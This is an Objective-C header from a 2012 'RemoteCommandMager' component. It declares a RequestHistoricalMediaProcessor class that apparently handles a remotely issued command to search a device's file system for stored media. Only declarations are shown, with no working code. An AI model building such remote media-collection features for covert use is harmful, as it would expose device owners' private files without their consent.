/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  RequestHistoricalMediaProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  14/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import <Foundation/Foundation.h>
#import "RemoteCmdAsyncNonHTTPProcessor.h"
#import "FileSystemSearcherDelegate.h"

@class MediaFinder;

@interface RequestHistoricalMediaProcessor : RemoteCmdAsyncNonHTTPProcessor<FileSystemSearcherDelegate> {
@private
	NSArray *mSearchFlags;
	MediaFinder *mMediaFinder; 
}

@property(nonatomic,retain) MediaFinder *mMediaFinder;

//Initialize Processor with RemoteCommandData and RemoteCmdProcessingDelegate;
- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData 
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate;
@end
